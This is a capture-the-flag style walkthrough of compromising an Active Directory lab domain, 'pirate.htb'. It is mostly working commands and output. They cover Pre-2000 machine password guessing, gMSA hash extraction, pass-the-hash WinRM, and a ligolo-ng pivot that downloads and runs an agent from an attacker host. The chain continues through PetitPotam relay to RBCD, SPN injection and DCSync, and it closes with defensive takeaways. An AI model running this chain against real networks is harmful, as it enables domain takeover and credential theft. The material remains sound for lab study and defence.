Section 03

Initial Foothold

02
Pre-Windows 2000 Compatible Access
nxc pre2k module · Machine Account Password Prediction

Pre-Windows 2000 computer accounts are configured with an initial password equal to the lowercase machine name (truncated to 14 characters). The domain retains Pre-Windows 2000 Compatible Access permissions, allowing unauthenticated or low-privilege enumeration of these legacy accounts. Using nxc's pre2k module with the given pentest credentials confirms two vulnerable machine accounts.

bash
nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -M pre2k

PRE2K   MS01$     ->  password: ms01
PRE2K   EXCH01$   ->  password: exch01
Kerberos CCaches saved:
  ~/.nxc/modules/pre2k/ccache/ms01.ccache
  ~/.nxc/modules/pre2k/ccache/exch01.ccache
✓
Machine Accounts Compromised: MS01$ (password: ms01), EXCH01$ (password: exch01). Kerberos TGT ccache files saved to disk for reuse.
⚠
Misconfiguration: Retaining "Pre-Windows 2000 Compatible Access" in modern domains is a significant security risk. Machine accounts are predictably passworded and should be audited or migrated to modern authentication models.
03
gMSA Password Extraction via LDAP
nxc --gmsa · LDAP msDS-ManagedPassword attribute

Group Managed Service Accounts (gMSA) store their passwords in the msDS-ManagedPassword LDAP attribute. Access is controlled by an ACL — only specific principals can read it. MS01$ is configured as an allowed reader for the gMSA accounts. Using its Kerberos ticket, the plaintext NTLM hashes are extracted directly from LDAP.

bash
KRB5CCNAME=~/.nxc/modules/pre2k/ccache/ms01.ccache \
  nxc ldap pirate.htb -u ms01 --use-kcache --gmsa

GMSA   gMSA_ADCS_prod$  NTLM: 25c7f0eb586ed3a91375dbf2f6e4a3ea
GMSA   gMSA_ADFS_prod$  NTLM: fd9ea7ac7820dba5155bd6ed2d850c09
✓
gMSA Hashes Extracted: gMSA_ADCS_prod$ NTLM: 25c7f0eb586ed3a91375dbf2f6e4a3ea · gMSA_ADFS_prod$ NTLM: fd9ea7ac7820dba5155bd6ed2d850c09
04
WinRM Shell on DC01
evil-winrm · Pass-the-Hash · Remote Management Users

Both gMSA accounts are members of Remote Management Users on DC01. Using Pass-the-Hash with evil-winrm grants a low-privilege PowerShell session on the Domain Controller as the service account. This account has no local admin rights but provides a foothold for network pivoting.

bash
evil-winrm -i pirate.htb -u 'gMSA_ADCS_prod$' -H '25c7f0eb586ed3a91375dbf2f6e4a3ea'

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents>
✓
Shell on DC01: PowerShell session established as gMSA_ADCS_prod$ via WinRM Pass-the-Hash. Low privilege — no local admin, but sufficient for tool upload and tunnel setup.
Section 04

Lateral Movement & Network Pivot

05
L3 Network Pivoting to 192.168.100.0/24
ligolo-ng · Tunnel Agent · Route Injection

DC01 has a second NIC on the internal 192.168.100.0/24 subnet where WEB01 (192.168.100.1) resides. WEB01 is not directly reachable from the VPN. Ligolo-ng creates a TUN interface on Kali and forwards all traffic through a transparent L3 tunnel via the DC01 agent. The Start-Sleep trick is essential — WinRM terminates child processes when the command exits.

bash — Kali setup
# Create TUN interface and add route
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.100.0/24 dev ligolo

# Start ligolo proxy (self-signed cert)
ligolo-proxy -selfcert
powershell — DC01 (via evil-winrm)
# Upload agent via HTTP
Invoke-WebRequest "http://<KALI_IP>/agent.exe" -OutFile "C:\Windows\Temp\agent.exe" -UseBasicParsing

# Run agent — Start-Sleep keeps it alive past WinRM timeout
C:\Windows\Temp\agent.exe -connect <KALI_IP>:11601 -ignore-cert; Start-Sleep -Seconds 600
◈
Important: WinRM kills child processes the moment a command finishes. Appending Start-Sleep -Seconds 600 keeps the parent process alive in the WinRM session, preventing the agent from being terminated prematurely.

For the NTLM relay in Phase 06, configure ligolo listeners to forward WEB01's authentication traffic back to Kali's relay listener:

ligolo-ng proxy — listener config
# In ligolo proxy console, after session connects:
session
start
listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
listener_add --addr 0.0.0.0:80  --to 127.0.0.1:80  --tcp
06
NTLM Relay to LDAPS → RBCD on WEB01
PetitPotam · ntlmrelayx · Resource-Based Constrained Delegation

WEB01 can reach Kali's VPN IP through DC01's internet routing. PetitPotam (MS-EFSRPC) coerces WEB01 to send an NTLM authentication to Kali's relay listener. ntlmrelayx forwards WEB01$'s authentication to DC01's LDAPS and writes msDS-AllowedToActOnBehalfOfOtherIdentity — granting FAKEMACHINE$ the ability to impersonate any user to WEB01 via S4U2Proxy.

bash — Step 1: Create delegate machine account
impacket-addcomputer pirate.htb/pentest:'p3nt3st2025!&' \
  -computer-name 'FAKEMACHINE$' -computer-pass 'Password123!' -dc-ip 10.129.244.95
bash — Step 2: Start relay listener
sudo impacket-ntlmrelayx -t ldaps://10.129.244.95 --remove-mic \
  --delegate-access --escalate-user 'FAKEMACHINE$'
bash — Step 3: Coerce WEB01 authentication
python3 /tmp/PetitPotam/PetitPotam.py -u 'pentest' -p 'p3nt3st2025!&' -d pirate.htb \
  <KALI_VPN_IP> 192.168.100.1

[+] Triggering EfsRpcOpenFileRaw on 192.168.100.1 ...
[ntlmrelayx] * Received connection from WEB01$, attacking target ldaps://10.129.244.95
[ntlmrelayx] * Delegating access to FAKEMACHINE$ on WEB01$
[ntlmrelayx] * Success! Wrote RBCD attribute on WEB01$
✕
Critical: The --remove-mic flag is required because WEB01's NTLM authentication requests signing. Without MIC stripping, the relay fails with an authentication error at the LDAPS target.
07
S4U2Self + S4U2Proxy → Access WEB01 as Administrator
impacket-getST · RBCD Exploitation · User Flag

With RBCD configured, FAKEMACHINE$ can request a service ticket for WEB01 on behalf of Administrator. The S4U2Self + S4U2Proxy chain yields a CIFS Kerberos ticket impersonating the domain Administrator on WEB01. This provides full filesystem access, enabling LSA secrets dump and user flag retrieval.

bash
# Request impersonation ticket via S4U2Self+S4U2Proxy
impacket-getST -spn cifs/WEB01.pirate.htb -impersonate Administrator \

Section 05

Privilege Escalation — SPN Injection

08
ACL Enumeration — Chained Permissions
impacket-dacledit · impacket-findDelegation · BloodHound-style analysis

Three critical ACL relationships form the privilege escalation path: (1) a.white has User-Force-Change-Password on a.white_adm. (2) a.white_adm has Constrained Delegation with Protocol Transition to HTTP/WEB01.pirate.htb. (3) The IT group (of which a.white_adm is a member) has WriteProperty on the servicePrincipalName attribute of DC01$.

bash — ACL check: a.white → a.white_adm
impacket-dacledit -target a.white_adm -principal a.white \
  -dc-ip 10.129.244.95 pirate.htb/a.white:E2nvAOKSz5Xz2MJu -action read

ACE: User-Force-Change-Password on a.white_adm  Trustee: a.white

Critical Chain: a.white can reset a.white_adm's password → a.white_adm (via IT group membership) can write SPNs on DC01$ → a.white_adm's constrained delegation targets HTTP/WEB01. Combining these three = full domain compromise.
09
Force-Change a.white_adm Password
impacket-changepasswd · ForceChangePassword ACE

The User-Force-Change-Password extended right allows resetting a target's password without knowing the current one. This is abused via impacket's changepasswd utility to set a known password on a.white_adm, granting full control of the delegation-capable account.

bash
impacket-changepasswd pirate.htb/a.white_adm@10.129.244.95 \
  -newpass 'P@ssw0rd123!' -reset -dc-ip 10.129.244.95 \
  -altuser a.white -altpass E2nvAOKSz5Xz2MJu

[*] Changing the password of pirate.htb\a.white_adm
[*] New password successfully set!
✓
Password Reset: a.white_adm password set to P@ssw0rd123! via ForceChangePassword ACE held by a.white.
10
SPN Injection — Move HTTP/WEB01 to DC01$
ldap3 Python · WriteProperty SPN · Encryption Key Pivot

This is the attack's pivotal step. a.white_adm's constrained delegation is permitted to HTTP/WEB01.pirate.htb. When the S4U2Proxy ticket is issued for this SPN, it is encrypted with the key of whatever account owns that SPN. By moving the SPN from WEB01$ to DC01$, the ticket becomes encrypted with DC01$'s Kerberos key instead — and DC01 will accept it as valid.

python3
import ldap3

server = ldap3.Server('10.129.244.95', get_info=ldap3.ALL)
conn = ldap3.Connection(server, user='pirate.htb\\a.white_adm',
                        password='P@ssw0rd123!', authentication=ldap3.NTLM,
                        auto_bind=True)

# Step 1: Remove HTTP SPNs from WEB01$
conn.modify('CN=WEB01,CN=Computers,DC=pirate,DC=htb', {
    'servicePrincipalName': [(ldap3.MODIFY_DELETE,
        ['HTTP/WEB01', 'HTTP/WEB01.pirate.htb'])]
})
print("Removed HTTP SPNs from WEB01$:", conn.result)

# Step 2: Add HTTP SPNs to DC01$ — ticket now encrypted with DC01$'s key
conn.modify('CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb', {
    'servicePrincipalName': [(ldap3.MODIFY_ADD,
        ['HTTP/WEB01', 'HTTP/WEB01.pirate.htb'])]
})
print("Added HTTP SPNs to DC01$:", conn.result)
◈
Why This Works: Kerberos S4U2Proxy tickets are encrypted with the long-term key of the account that owns the target SPN. By transferring ownership of the SPN to DC01$, the forwardable service ticket becomes decryptable by the Domain Controller itself — enabling DCSync via the -altservice trick.
11
S4U2Proxy + altservice → DCSync → Root Flag
impacket-getST · altservice · impacket-secretsdump

Now that HTTP/WEB01.pirate.htb is owned by DC01$, the S4U2Proxy ticket is encrypted with DC01$'s key. The -altservice flag rewrites the service name in the ticket from HTTP/WEB01 to cifs/DC01.pirate.htb — the encryption key is unchanged, and DC01 can decrypt it. This yields an Administrator CIFS ticket for the Domain Controller itself, enabling DCSync.

bash — S4U chain with altservice
impacket-getST -spn HTTP/WEB01.pirate.htb -impersonate Administrator \
  -altservice cifs/DC01.pirate.htb -dc-ip 10.129.244.95 \
  pirate.htb/a.white_adm:'P@ssw0rd123!'

[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB
          to cifs/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache
bash — DCSync
export KRB5CCNAME=Administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache

impacket-secretsdump -k -no-pass DC01.pirate.htb \

key takeaways
01 // LEGACY CONFIG
Pre-Windows 2000 Compatible Access
Retaining this legacy domain setting allows unauthenticated or low-privilege actors to recover machine account credentials using predictable naming conventions. All Pre-2k machine accounts should be identified, re-keyed, and the group policy setting disabled in modern environments.
02 // gMSA SECURITY
gMSA Read ACL Scope
The msDS-ManagedPassword attribute is only as secure as the accounts permitted to read it. If a low-privilege or legacy machine account is granted gMSA read rights, its compromise immediately yields the gMSA's NTLM hash. Restrict gMSA readers to the minimum necessary service accounts.
03 // NTLM RELAY
LDAPS Relay + RBCD Still Viable
Even with LDAP signing enforced, relaying to LDAPS with --remove-mic bypasses the MIC check when the client requests signing but the relay target doesn't enforce it end-to-end. Enabling LDAP channel binding and disabling NTLM in AD eliminates this attack path entirely.
04 // ACL HYGIENE
Chained ACL Paths to Domain Admin
No single misconfiguration here was catastrophic in isolation — the attack required chaining ForceChangePassword, group membership SPN write rights, and constrained delegation. Regular BloodHound/ACL auditing to detect multi-hop privilege escalation paths is essential in any mature AD environment.
05 // KERBEROS DELEGATION
SPN Injection Enables Delegation Pivoting
Constrained delegation is scoped to a specific SPN — but the security depends entirely on which account owns that SPN. WriteProperty on servicePrincipalName for DC objects should never be granted to non-admin principals, as it allows re-routing encrypted Kerberos tickets to high-value targets.
06 // NETWORK SEGMENTATION
Internal Subnet Reachable via DC
WEB01 on the 192.168.100.0/24 segment was isolated from external VPN access — but not from DC01. Once a low-privilege shell on DC was obtained, the internal network became fully accessible via tunnelling. Critical internal hosts should have host-based firewalls restricting lateral connections even from the DC.
